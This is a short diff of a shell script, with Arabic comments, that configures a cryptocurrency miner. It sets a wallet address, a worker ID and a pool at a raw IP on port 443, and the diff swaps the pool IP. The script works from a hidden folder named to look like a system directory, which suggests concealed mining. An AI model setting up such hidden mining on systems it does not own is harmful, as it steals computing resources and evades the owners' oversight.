@@ -2,8 +2,8 @@
 
 # إعداد بيانات المحفظة والمعدّن
 WALLET="88DcxveXeHaRDYLbmAxBuMZBsYwEtrDcb4EUWJvCQjKsNo2ieFTrBLNBhpVdFfLTXnRDcnJgg7Fpre43fbFMnfxkV2ZrpEm"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
-WORKER="300"
-POOL="45.155.102.89:443"
+WORKER="200"
+POOL="66.23.199.44:443"
 THREADS=4
 # مجلد العمل
 WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
